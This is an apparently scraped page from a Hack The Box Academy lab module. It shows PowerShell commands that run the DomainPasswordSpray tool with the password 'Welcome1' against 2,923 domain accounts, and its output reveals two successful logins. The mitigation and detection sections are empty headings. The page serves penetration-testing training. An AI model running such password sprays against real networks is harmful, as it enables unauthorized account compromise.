<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/143/section/1422
// Platform Version: V1
// Module ID: 143
// Module Name: Active Directory Enumeration & Attacks
// Module Difficulty: Medium
// Section ID: 1422
// Section Title: Internal Password Spraying - from Windows
// Page Title: Active Directory Enumeration & Attacks
// Page Number: 12
-->

# Internal Password Spraying - from Windows

**Module Name:** Active Directory Enumeration & Attacks **Page Number:** 12

#### ACTIVE DIRECTORY ENUMERATION & ATTACKS

# Internal Password Spraying - from Windows

#### Using DomainPasswordSpray.ps1

```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

## Mitigations

## Other Considerations

## Detection

## External Password Spraying

## Moving Deeper

# 

# 

#### Questions

####